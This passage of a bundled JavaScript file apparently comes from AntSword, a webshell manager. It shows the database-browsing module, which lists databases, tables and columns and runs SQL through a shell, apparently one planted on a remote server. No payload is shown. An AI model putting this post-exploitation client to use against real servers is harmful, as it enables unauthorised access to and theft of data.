	          _this4.tree.insertNewItem('conn::' + id, 'database::' + id + ':' + _db, _, null, _this4.manager.list.imgs[1], _this4.manager.list.imgs[1], _this4.manager.list.imgs[1]);
	        });
	        _this4.manager.list.layout.progressOff();
	      }, function (err) {
	        toastr.error('获取数据库列表失败！' + err['status'] || JSON.stringify(err), 'ERROR');
	        _this4.manager.list.layout.progressOff();
	      });
	    }

	    // 获取数据库表数据

	  }, {
	    key: 'getTables',
	    value: function getTables(id, db) {
	      var _this5 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_tables({
	        conn: conf['conn'],
	        dbname: db
	      }, function (ret) {
	        var arr = ret.split('\t');
	        var _db = new Buffer(db).toString('base64');
	        // 删除子节点
	        _this5.tree.deleteChildItems('database::' + id + ':' + _db);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _table = new Buffer(_).toString('base64');
	          _this5.tree.insertNewItem('database::' + id + ':' + _db, 'table::' + id + ':' + _db + ':' + _table, _, null, _this5.manager.list.imgs[2], _this5.manager.list.imgs[2], _this5.manager.list.imgs[2]);
	        });
	        _this5.manager.list.layout.progressOff();
	      });
	    }

	    // 获取字段

	  }, {
	    key: 'getColumns',
	    value: function getColumns(id, db, table) {
	      var _this6 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_columns({
	        conn: conf['conn'],
	        table: conf['type'] === 'oracle' ? 'SELECT * FROM (SELECT A.*,ROWNUM N FROM ' + table + ' A) WHERE N=1' : 'SELECT TOP 1 * FROM ' + table
	      }, function (ret) {
	        var arr = ret.split('\t');
	        var _db = new Buffer(db).toString('base64');
	        var _table = new Buffer(table).toString('base64');
	        // 删除子节点
	        _this6.tree.deleteChildItems('table::' + id + ':' + _db + ':' + _table);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _column = new Buffer(_.split(' ')[0]).toString('base64');
	          _this6.tree.insertNewItem('table::' + id + ':' + _db + ':' + _table, 'column::' + id + ':' + _db + ':' + _table + ':' + _column, _, null, _this6.manager.list.imgs[3], _this6.manager.list.imgs[3], _this6.manager.list.imgs[3]);
	        });
	        // 更新编辑器SQL语句
	        _this6.manager.query.editor.session.setValue(conf['type'] === 'oracle' ? 'SELECT * FROM (SELECT A.*,ROWNUM N FROM ' + table + ' A ORDER BY 1 DESC) WHERE N>0 AND N<=20' : 'SELECT TOP 20 * FROM ' + table + ' ORDER BY 1 DESC;');
	        _this6.manager.list.layout.progressOff();
	      });
	    }

	    // 执行SQL

	  }, {
	    key: 'execSQL',
	    value: function execSQL(sql) {
	      var _this7 = this;

	      this.manager.query.layout.progressOn();
	      this.core['database_' + this.dbconf['type']].query({
	        conn: this.dbconf['conn'],
	        sql: sql
	      }, function (ret) {
	        // 更新执行结果
	        _this7.updateResult(ret);
	        _this7.manager.query.layout.progressOff();
	      }, function (err) {
	        console.error(err);
	      });
	    }

	    // 更新SQL执行结果

	  }, {
	    key: 'updateResult',
	    value: function updateResult(data) {
	      // 1.分割数组
	      var arr = data.split('\n');
	      // let arr = [];
	      // _arr.map((_) => {
	      //   arr.push(antSword.noxss(_));
	      // });
	      // console.log(_arr, arr);
	      // 2.判断数据
	      if (arr.length < 2) {
	        return console.log('数据不正确');
	      };
	      // 3.行头
	      var header_arr = arr[0].split('\t|\t');
	      if (header_arr.length === 1) {
	        return toastr.warning('没有查询结果');
	      };
	      if (header_arr[header_arr.length - 1] === '\r') {
	        header_arr.pop();
	      };
	      arr.shift();
	      // 4.数据
	      var data_arr = [];
	      arr.map(function (_) {
	        var _data = _.split('\t|\t');
	        data_arr.push(_data);
	      });
	      data_arr.pop();
	      // 5.初始化表格
	      var grid = this.manager.result.layout.attachGrid();
	      grid.clearAll();
	      grid.setHeader(header_arr.join(',').replace(/,$/, ''));
	      grid.setColSorting('str,'.repeat(header_arr.length).replace(/,$/, ''));
	      grid.setInitWidths('*');
	      grid.setEditable(true);
	      grid.init();
	      // 添加数据
	      var grid_data = [];
	      for (var i = 0; i < data_arr.length; i++) {
	        grid_data.push({
	          id: i + 1,
	          data: data_arr[i]
	        });
	      }
	      grid.parse({
	        'rows': grid_data
	      }, 'json');
	      // 启用导出按钮
	      // this.manager.result.toolbar[grid_data.length > 0 ? 'enableItem' : 'disableItem']('dump');
	    }

	    // 禁用toolbar按钮

	  }, {
	    key: 'disableToolbar',
	    value: function disableToolbar() {
	      this.manager.list.toolbar.disableItem('del');
	    }

	    // 启用toolbar按钮

	  }, {
	    key: 'enableToolbar',
	    value: function enableToolbar() {
	      this.manager.list.toolbar.enableItem('del');
	    }

	    // 禁用SQL编辑框

	  }, {
	    key: 'disableEditor',
	    value: function disableEditor() {
	      var _context;

	      ['exec', 'clear'].map((_context = this.manager.query.toolbar, this.manager.query.toolbar.disableItem).bind(_context));
	      this.manager.query.editor.setReadOnly(true);
	    }

	    // 启用SQL编辑框

	  }, {
	    key: 'enableEditor',
	    value: function enableEditor() {
	      var _context2;

	      ['exec', 'clear'].map((_context2 = this.manager.query.toolbar, this.manager.query.toolbar.enableItem).bind(_context2));
	      this.manager.query.editor.setReadOnly(false);
	    }
	  }]);

	  return ASP;
	}();

	module.exports = ASP;
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 75 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// 数据库驱动::ASPX
	//

	module.exports = __webpack_require__(74);

/***/ },
/* 76 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {'use strict';

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 数据库驱动::ASP
	// 支持数据库:access,sqlserver,mysql
	//

	var ASP = function () {
	  function ASP(opt) {
	    var _this = this;

	    _classCallCheck(this, ASP);

	    this.opt = opt;
	    this.core = this.opt.core;
	    this.manager = this.opt.super;
	    //
	    // * 数据库驱动列表
	    //
	    this.conns = {
	      'mysql': 'com.mysql.jdbc.Driver\r\njdbc:mysql://localhost/test?user=root&password=123456',
	      'sqlserver': 'com.microsoft.sqlserver.jdbc.SQLServerDriver\r\njdbc:sqlserver://127.0.0.1:1433;databaseName=test;user=sa;password=123456',
	      'oracle': 'oracle.jdbc.driver.OracleDriver\r\njdbc:oracle:thin:user/password@127.0.0.1:1521/test'
	    };
	    // 1. 初始化TREE UI
	    this.tree = this.manager.list.layout.attachTree();
	    // 2. 加载数据库配置
	    this.parse();
	    // 3. tree单击::设置当前配置&&激活按钮
	    this.tree.attachEvent('onClick', function (id) {
	      // 更改按钮状态
	      id.startsWith('conn::') ? _this.enableToolbar() : _this.disableToolbar();
	      // 设置当前配置
	      var tmp = id.split('::');
	      var arr = tmp[1].split(':');
	      // 设置当前数据库
	      _this.dbconf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: _this.manager.opt['_id'],
	        id: arr[0]
	      });
	      if (arr.length > 1) {
	        _this.dbconf['database'] = new Buffer(arr[1], 'base64').toString();
	        // 更新SQL编辑器
	        _this.enableEditor();
	        // manager.query.update(this.currentConf);
	      } else {
	          _this.disableEditor();
	        }
	    });
	    // 4. tree双击::加载库/表/字段
	    this.tree.attachEvent('onDblClick', function (id) {
	      var arr = id.split('::');
	      if (arr.length < 2) {
	        throw new Error('ID ERR: ' + id);
	      };
	      switch (arr[0]) {
	        // 获取数据库列表
	        case 'conn':
	          _this.getDatabases(arr[1]);
	          break;
	        // 获取数据库表名
	        case 'database':
	          var _db = arr[1].split(':');
	          _this.getTables(_db[0], new Buffer(_db[1], 'base64').toString());
	          break;
	        // 获取表名字段
	        case 'table':
	          var _tb = arr[1].split(':');
	          _this.getColumns(_tb[0], new Buffer(_tb[1], 'base64').toString(), new Buffer(_tb[2], 'base64').toString());
	          break;
	        // 生成查询SQL语句
	        case 'column':
	          var _co = arr[1].split(':');
	          var table = new Buffer(_co[2], 'base64').toString();
	          var column = new Buffer(_co[3], 'base64').toString();

	          var sql = 'SELECT TOP 20 [' + column + '] FROM [' + table + '] ORDER BY 1 DESC;';
	          _this.manager.query.editor.session.setValue(sql);
	          break;
	      }
	    });
	    // 5. tree右键::功能菜单
	    this.tree.attachEvent('onRightClick', function (id, event) {
	      if (!id.startsWith('conn::')) {
	        return;
	      };
	      _this.tree.selectItem(id);
	      _this.tree.callEvent('onClick', [id]);
	      bmenu([{
	        text: '添加配置',
	        icon: 'fa fa-plus-circle',
	        action: _this.addConf.bind(_this)
	      }, {
	        divider: true
	      }, {
	        text: '删除配置',
	        icon: 'fa fa-remove',
	        action: _this.delConf.bind(_this)
	      }], event);
	    });
	  }

	  // 加载配置列表


	  _createClass(ASP, [{
	    key: 'parse',
	    value: function parse() {
	      // 获取数据
	      var info = antSword['ipcRenderer'].sendSync('shell-findOne', this.manager.opt['_id']);
	      var conf = info['database'] || {};
	      // 刷新UI
	      // 1.清空数据
	      this.tree.deleteChildItems(0);
	      // 2.添加数据
	      var items = [];
	      for (var _ in conf) {
	        items.push({
	          id: 'conn::' + _,
	          // text: `${conf[_]['type']}:\/\/${conf[_]['user']}@${conf[_]['host']}`,
	          text: conf[_]['type'].toUpperCase(),
	          im0: this.manager.list.imgs[0],
	          im1: this.manager.list.imgs[0],
	          im2: this.manager.list.imgs[0]
	        });
	      }
	      // 3.刷新UI
	      this.tree.parse({
	        id: 0,
	        item: items
	      }, 'json');
	      // 禁用按钮
	      this.disableToolbar();
	      this.disableEditor();
	    }

	    // 添加配置

	  }, {
	    key: 'addConf',
	    value: function addConf() {
	      var _this2 = this;

	      var hash = (+new Date() * Math.random()).toString(16).substr(2, 8);
	      // 创建窗口
	      var win = this.manager.win.createWindow(hash, 0, 0, 450, 300);
	      win.setText('添加配置');
	      win.centerOnScreen();
	      win.button('minmax').hide();
	      win.setModal(true);
	      win.denyResize();
	      // 工具栏
	      var toolbar = win.attachToolbar();
	      toolbar.loadStruct([{
	        id: 'add',
	        type: 'button',
	        icon: 'plus-circle',
	        text: '添加'
	      }, {
	        type: 'separator'
	      }, {
	        id: 'clear',
	        type: 'button',
	        icon: 'remove',
	        text: '清空'
	      }]);

	      // form
	      var form = win.attachForm([{ type: 'settings', position: 'label-left', labelWidth: 80, inputWidth: 280 }, { type: 'block', inputWidth: 'auto', offsetTop: 12, list: [{ type: 'combo', label: '数据库类型', readonly: true, name: 'type', options: function () {
	            var ret = [];
	            for (var _ in _this2.conns) {
	              ret.push({
	                text: _.toUpperCase(),
	                value: _
	              });
	            }
	            return ret;
	          }() }, { type: 'input', label: '连接字符串', name: 'conn', required: true, value: 'com.mysql.jdbc.Driver\r\njdbc:mysql://localhost/test?user=root&password=123456', rows: 9 }] }], true);

	      form.attachEvent('onChange', function (_, id) {
	        if (_ !== 'type') {
	          return;
	        };
	        form.setFormData({
	          conn: _this2.conns[id]
	        });
	      });

	      // 工具栏点击事件
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'clear':
	            form.clear();
	            break;
	          case 'add':
	            if (!form.validate()) {
	              return '填写完整！';
	              // return toastr.warning(LANG['list']['add']['warning'], LANG_T['warning']);
	            };
	            // 解析数据
	            var data = form.getValues();
	            // 验证是否连接成功(获取数据库列表)
	            var id = antSword['ipcRenderer'].sendSync('shell-addDataConf', {
	              _id: _this2.manager.opt['_id'],
	              data: data
	            });
	            win.close();
	            toastr.success('添加配置成功!');
	            _this2.tree.insertNewItem(0, 'conn::' + id,
	            // `${data['type']}:\/\/${data['user']}@${data['host']}`,
	            data['type'].toUpperCase(), null, _this2.manager.list.imgs[0], _this2.manager.list.imgs[0], _this2.manager.list.imgs[0]);
	            break;
	        }
	      });
	    }

	    // 删除配置

	  }, {
	    key: 'delConf',
	    value: function delConf() {
	      var _this3 = this;

	      var id = this.tree.getSelected().split('::')[1];
	      layer.confirm('确定删除此配置吗？', {
	        icon: 2, shift: 6,
	        title: '删除配置'
	      }, function (_) {
	        layer.close(_);
	        var ret = antSword['ipcRenderer'].sendSync('shell-delDataConf', {
	          _id: _this3.manager.opt['_id'],
	          id: id
	        });
	        if (ret === 1) {
	          toastr.success('删除配置成功！');
	          _this3.tree.deleteItem('conn::' + id);
	          // 禁用按钮
	          _this3.disableToolbar();
	          _this3.disableEditor();
	          // ['edit', 'del'].map(this.toolbar::this.toolbar.disableItem);
	          // this.parse();
	        } else {
	            toastr.error('删除配置失败！<br/>' + ret);
	          }
	      });
	    }

	    // 获取数据库列表

	  }, {
	    key: 'getDatabases',
	    value: function getDatabases(id) {
	      var _this4 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_databases({
	        conn: conf['conn'],
	        encode: this.manager.opt.encode,
	        dbname: ['access', 'microsoft_jet_oledb_4_0'].indexOf(conf['type']) > -1 ? conf['conn'].match(/[\w]+.mdb$/) : 'database'
	      }, function (ret) {
	        var arr = ret.split('\t');
	        if (arr.length === 1 && ret === '') {
	          toastr.warning('执行完毕，没有结果返回');
	          return _this4.manager.list.layout.progressOff();
	        };
	        // 删除子节点
	        _this4.tree.deleteChildItems('conn::' + id);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _db = new Buffer(_).toString('base64');
	          _this4.tree.insertNewItem('conn::' + id, 'database::' + id + ':' + _db, _, null, _this4.manager.list.imgs[1], _this4.manager.list.imgs[1], _this4.manager.list.imgs[1]);
	        });
	        _this4.manager.list.layout.progressOff();
	      }, function (err) {
	        toastr.error('获取数据库列表失败！' + err['status'] || JSON.stringify(err), 'ERROR');
	        _this4.manager.list.layout.progressOff();
	      });
	    }

	    // 获取数据库表数据

	  }, {
	    key: 'getTables',
	    value: function getTables(id, db) {
	      var _this5 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_tables({
	        conn: conf['conn'],
	        encode: this.manager.opt.encode,
	        dbname: db
	      }, function (ret) {
	        var arr = ret.split('\t');
	        var _db = new Buffer(db).toString('base64');
	        // 删除子节点
	        _this5.tree.deleteChildItems('database::' + id + ':' + _db);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _table = new Buffer(_).toString('base64');
	          _this5.tree.insertNewItem('database::' + id + ':' + _db, 'table::' + id + ':' + _db + ':' + _table, _, null, _this5.manager.list.imgs[2], _this5.manager.list.imgs[2], _this5.manager.list.imgs[2]);
	        });
	        _this5.manager.list.layout.progressOff();
	      });
	    }

	    // 获取字段

	  }, {
	    key: 'getColumns',
	    value: function getColumns(id, db, table) {
	      var _this6 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_columns({
	        conn: conf['conn'],
	        encode: this.manager.opt.encode,
	        table: conf['type'] === 'oracle' ? 'SELECT * FROM (SELECT A.*,ROWNUM N FROM ' + table + ' A) WHERE N=1' : 'SELECT TOP 1 * FROM ' + table
	      }, function (ret) {
	        var arr = ret.split('\t');
	        var _db = new Buffer(db).toString('base64');
	        var _table = new Buffer(table).toString('base64');
	        // 删除子节点
	        _this6.tree.deleteChildItems('table::' + id + ':' + _db + ':' + _table);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _column = new Buffer(_.split(' ')[0]).toString('base64');
	          _this6.tree.insertNewItem('table::' + id + ':' + _db + ':' + _table, 'column::' + id + ':' + _db + ':' + _table + ':' + _column, _, null, _this6.manager.list.imgs[3], _this6.manager.list.imgs[3], _this6.manager.list.imgs[3]);
	        });
	        // 更新编辑器SQL语句
	        _this6.manager.query.editor.session.setValue(conf['type'] === 'oracle' ? 'SELECT * FROM (SELECT A.*,ROWNUM N FROM ' + table + ' A ORDER BY 1 DESC) WHERE N>0 AND N<=20' : 'SELECT TOP 20 * FROM ' + table + ' ORDER BY 1 DESC;');
	        _this6.manager.list.layout.progressOff();
	      });
	    }

	    // 执行SQL

	  }, {
	    key: 'execSQL',
	    value: function execSQL(sql) {
	      var _this7 = this;

	      this.manager.query.layout.progressOn();
	      this.core['database_' + this.dbconf['type']].query({
	        conn: this.dbconf['conn'],
	        encode: this.manager.opt.encode,
	        sql: sql
	      }, function (ret) {
	        // 更新执行结果
	        _this7.updateResult(ret);
	        _this7.manager.query.layout.progressOff();
	      }, function (err) {
	        console.error(err);
	      });
	    }

	    // 更新SQL执行结果

	  }, {
	    key: 'updateResult',
	    value: function updateResult(data) {
	      // 1.分割数组
	      var arr = data.split('\n');
	      // let arr = [];
	      // _arr.map((_) => {
	      //   arr.push(antSword.noxss(_));
	      // });
	      // console.log(_arr, arr);
	      // 2.判断数据
	      if (arr.length < 2) {
	        return console.log('数据不正确');
	      };
	      // 3.行头
	      var header_arr = arr[0].split('\t|\t');
	      if (header_arr.length === 1) {
	        return toastr.warning('没有查询结果');
	      };
	      if (header_arr[header_arr.length - 1] === '\r') {
	        header_arr.pop();
	      };
	      arr.shift();
	      // 4.数据
	      var data_arr = [];
	      arr.map(function (_) {
	        var _data = _.split('\t|\t');
	        data_arr.push(_data);
	      });
	      data_arr.pop();
	      // 5.初始化表格
	      var grid = this.manager.result.layout.attachGrid();
	      grid.clearAll();
	      grid.setHeader(header_arr.join(',').replace(/,$/, ''));
	      grid.setColSorting('str,'.repeat(header_arr.length).replace(/,$/, ''));
	      grid.setInitWidths('*');
	      grid.setEditable(true);
	      grid.init();
	      // 添加数据
	      var grid_data = [];
	      for (var i = 0; i < data_arr.length; i++) {
	        grid_data.push({
	          id: i + 1,
	          data: data_arr[i]
	        });
	      }
	      grid.parse({
	        'rows': grid_data
	      }, 'json');
	      // 启用导出按钮
	      // this.manager.result.toolbar[grid_data.length > 0 ? 'enableItem' : 'disableItem']('dump');
	    }

	    // 禁用toolbar按钮

	  }, {
	    key: 'disableToolbar',
	    value: function disableToolbar() {
	      this.manager.list.toolbar.disableItem('del');
	    }

	    // 启用toolbar按钮

	  }, {
	    key: 'enableToolbar',
	    value: function enableToolbar() {
	      this.manager.list.toolbar.enableItem('del');
	    }

	    // 禁用SQL编辑框

	  }, {
	    key: 'disableEditor',
	    value: function disableEditor() {
	      var _context;

	      ['exec', 'clear'].map((_context = this.manager.query.toolbar, this.manager.query.toolbar.disableItem).bind(_context));
	      this.manager.query.editor.setReadOnly(true);
	    }

	    // 启用SQL编辑框

	  }, {
	    key: 'enableEditor',
	    value: function enableEditor() {
	      var _context2;

	      ['exec', 'clear'].map((_context2 = this.manager.query.toolbar, this.manager.query.toolbar.enableItem).bind(_context2));
	      this.manager.query.editor.setReadOnly(false);
	    }
	  }]);

	  return ASP;
	}();

	module.exports = ASP;
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 77 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 数据库管理模块
	//

	// import React from 'react';
	// import ReactDOM from 'react-dom';
	// import AceEditor from 'react-ace';

	var LANG = antSword['language']['database'];

	var Database = function () {
	  function Database(opt) {
	    _classCallCheck(this, Database);

	    this.hash = (+new Date() * Math.random()).toString(16).substr(2, 8);

	    // 初始化UI
	    var tabbar = antSword['tabbar'];
	    tabbar.addTab('tab_database_' + this.hash, '<i class="fa fa-database"></i> ' + opt['ip'], null, null, true, true);
	    this.cell = tabbar.cells('tab_database_' + this.hash);
	    this.cell.progressOn();

	    // layout
	    this.layout_main = this.cell.attachLayout('2U');
	    this.layout_right = this.layout_main.cells('b').attachLayout('2E');

	    this.list = this.initList(this.layout_main.cells('a'));
	    this.query = this.initQuery(this.layout_right.cells('a'));
	    this.result = this.initResult(this.layout_right.cells('b'));

	    this.opt = opt;
	    this.win = new dhtmlXWindows();
	    this.win.attachViewportTo(this.cell.cell);

	    // 加载数据库驱动
	    var _module = __webpack_require__(78)("./" + opt['type'] + '/index');
	    this.drive = new _module({
	      core: new antSword['core'][opt['type']](opt),
	      super: this
	    });
	    this.cell.progressOff();
	  }

	  // 初始化左侧列表


	  _createClass(Database, [{
	    key: 'initList',
	    value: function initList(layout) {
	      var _this = this;

	      layout.setText('<i class="fa fa-server"></i> ' + LANG['list']['title']);
	      layout.setWidth('250');

	      // tree图标
	      var imgs = [
	      // connect
	      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAPCAQAAACouOyaAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAAAGQAAABkAA+Wxd0AAAEUSURBVCjPddA9S1txAIXx370JwVCJ0YRCI4FARl2EOrrZdu4USjt0yDewg7uLk1/AF0gcXJylu7MQEUpbaCHcraGNbSik6r1/h2ZIhpzpnIdnOkxnz8B3A/vTMJ5RarpeOFGbr0RSYw+zdFb5ouXSO5/NzYJDQUdxGuZBVVGEIEOmOlljAyKxNz5YFoGykpEhCH47cBqp+Oi5X/6Bkif++gMKKnpe8cwnd95qamo6EnQnvWXsq3peEASJb2CI20l/KhOE2IqCWEWMBUsoKSJWlVOwwpVE4sYmdvQl+nax4Voi0Ys1tG0bqWPNuS1n1rFq7KX3arFMKpUJCNLJ+v9RKpXlZY7dW/QTP7S9VtbBUMOFvNwjiZlZspGW2aUAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTUtMDctMjVUMjE6NDk6MzQrMDg6MDAa6yDqAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE0LTA1LTAxVDIxOjEyOjA2KzA4OjAwmIBnWAAAAE50RVh0c29mdHdhcmUASW1hZ2VNYWdpY2sgNi44LjgtMTAgUTE2IHg4Nl82NCAyMDE1LTA3LTE5IGh0dHA6Ly93d3cuaW1hZ2VtYWdpY2sub3JnBQycNQAAACV0RVh0c3ZnOmNvbW1lbnQAIEdlbmVyYXRlZCBieSBJY29Nb29uLmlvIDDLy0gAAAAYdEVYdFRodW1iOjpEb2N1bWVudDo6UGFnZXMAMaf/uy8AAAAYdEVYdFRodW1iOjpJbWFnZTo6SGVpZ2h0ADY2N7Lgj5AAAAAXdEVYdFRodW1iOjpJbWFnZTo6V2lkdGgANzExhvGGCAAAABl0RVh0VGh1bWI6Ok1pbWV0eXBlAGltYWdlL3BuZz+yVk4AAAAXdEVYdFRodW1iOjpNVGltZQAxMzk4OTQ5OTI2Hzsr2gAAABN0RVh0VGh1bWI6OlNpemUANy4yMUtCQtXNgY4AAABadEVYdFRodW1iOjpVUkkAZmlsZTovLy9ob21lL3d3d3Jvb3Qvd3d3LmVhc3lpY29uLm5ldC9jZG4taW1nLmVhc3lpY29uLmNuL3NyYy8xMTU4Mi8xMTU4Mjc4LnBuZwIRWX8AAAAASUVORK5CYII=',
	      // databass
	      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAPCAQAAAB+HTb/AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAAAGQAAABkAA+Wxd0AAAEXSURBVBjTZck/S5RxAADg5+f75+5t8NTUSktEKCGCFp0U8dwcBMFBNwlu1a8Rrn4CJ0drdDF0bY1e4hAFQcEbTpT0ulfPc2irZ30C3lhWNabsrz/OHPrqLFiy6dKRXEMLmWHvzXlpm1xN6l+pmrzHiKbivyw0jQR36o4cqGtqo6TfpAXz3gUnNnwwpYIHxLiR+247lmnYkhjQL0PLFda0lWOpVUN+amjoIih75dqiUnBsVcWEVEcHkUjHrbrdWMWQfd+UPZOicKfkk3u9sUdzXvjl3I0WEs+99ttH3eDEosikAYmArnu3Ij98ibXN2JEjEuNBR2bdgiJyoaaqT0kikRn0VtWsaZ8Dxq2YNyr1iB6Fc4f2nD4BUO1Rv9s0w+gAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTUtMDctMjVUMjE6NTA6MjYrMDg6MDB8RcVXAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE0LTA1LTAxVDIwOjUwOjM1KzA4OjAwTl0AHAAAAE50RVh0c29mdHdhcmUASW1hZ2VNYWdpY2sgNi44LjgtMTAgUTE2IHg4Nl82NCAyMDE1LTA3LTE5IGh0dHA6Ly93d3cuaW1hZ2VtYWdpY2sub3JnBQycNQAAACV0RVh0c3ZnOmNvbW1lbnQAIEdlbmVyYXRlZCBieSBJY29Nb29uLmlvIDDLy0gAAAAYdEVYdFRodW1iOjpEb2N1bWVudDo6UGFnZXMAMaf/uy8AAAAYdEVYdFRodW1iOjpJbWFnZTo6SGVpZ2h0ADcxMRUA1lUAAAAXdEVYdFRodW1iOjpJbWFnZTo6V2lkdGgANjI03HRLcwAAABl0RVh0VGh1bWI6Ok1pbWV0eXBlAGltYWdlL3BuZz+yVk4AAAAXdEVYdFRodW1iOjpNVGltZQAxMzk4OTQ4NjM1LMlreQAAABN0RVh0VGh1bWI6OlNpemUAMjEuM0tCQnpsrG8AAABadEVYdFRodW1iOjpVUkkAZmlsZTovLy9ob21lL3d3d3Jvb3Qvd3d3LmVhc3lpY29uLm5ldC9jZG4taW1nLmVhc3lpY29uLmNuL3NyYy8xMTU3Ny8xMTU3NzMyLnBuZxOTOSYAAAAASUVORK5CYII=',
	      // table
	      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAABLAAAASwAJArFzAAAADgSURBVCjPfdA9L0NhGAbg660X7aaHQXo6kKYswmQUhPKT/Yl20sRQ0qKLGFjo11GW0w4t7unK/eRZ7qBsQ/BX3oMb+/j+5RjQDab//COaepUhSryZLGiLvnM7dp1oulhSN8o862FqNNfQU64sWpEaIbWuYpArNUQqBkNtAxTt6SzpgL5LNTWnWhq5mrnO9KJMzwMyQ49zzbpJVFC2iURUlggSUZKrEHxq+kDJkdtch9q5julrqKs713I911WuXpTpusfYQFdnQZPZDkFVUcVAmO8QVMXgTskYq7a9LGjN1w888l4QdsfN6AAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxNS0wNy0yNVQyMTo1MDozMiswODowMESg4doAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTQtMDQtMDZUMDk6NTM6MTcrMDg6MDA8MBsjAAAATnRFWHRzb2Z0d2FyZQBJbWFnZU1hZ2ljayA2LjguOC0xMCBRMTYgeDg2XzY0IDIwMTUtMDctMTkgaHR0cDovL3d3dy5pbWFnZW1hZ2ljay5vcmcFDJw1AAAAI3RFWHRzdmc6Y29tbWVudAAgR2VuZXJhdG9yOiBJY29Nb29uLmlvILwwrIAAAAAYdEVYdFRodW1iOjpEb2N1bWVudDo6UGFnZXMAMaf/uy8AAAAYdEVYdFRodW1iOjpJbWFnZTo6SGVpZ2h0ADUzM8q8AZUAAAAXdEVYdFRodW1iOjpJbWFnZTo6V2lkdGgANTMzWU1RyAAAABl0RVh0VGh1bWI6Ok1pbWV0eXBlAGltYWdlL3BuZz+yVk4AAAAXdEVYdFRodW1iOjpNVGltZQAxMzk2NzQ5MTk37+6JEgAAABN0RVh0VGh1bWI6OlNpemUAMi45NUtCQn9HCG8AAABadEVYdFRodW1iOjpVUkkAZmlsZTovLy9ob21lL3d3d3Jvb3Qvd3d3LmVhc3lpY29uLm5ldC9jZG4taW1nLmVhc3lpY29uLmNuL3NyYy8xMTQzNS8xMTQzNTI4LnBuZ1baGAoAAAAASUVORK5CYII=',
	      // column
